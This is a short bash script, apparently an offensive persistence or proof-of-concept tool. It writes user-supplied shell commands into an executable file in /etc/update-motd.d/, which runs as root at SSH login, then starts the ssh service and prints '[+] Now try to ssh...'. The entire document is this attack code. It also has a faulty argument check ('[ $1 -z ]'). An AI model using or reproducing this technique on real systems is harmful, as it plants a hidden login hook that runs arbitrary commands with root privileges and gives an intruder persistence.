#!/bin/bash

if [ $1 -z ]
then
        echo "$0 <shell commands or binary file path>"
        exit 1
fi

printf "#!/bin/bash\n$1" | sudo tee /etc/update-motd.d/na

sudo chmod +x /etc/update-motd.d/na

sudo /etc/init.d/ssh start

echo "[+] Now try to ssh..."
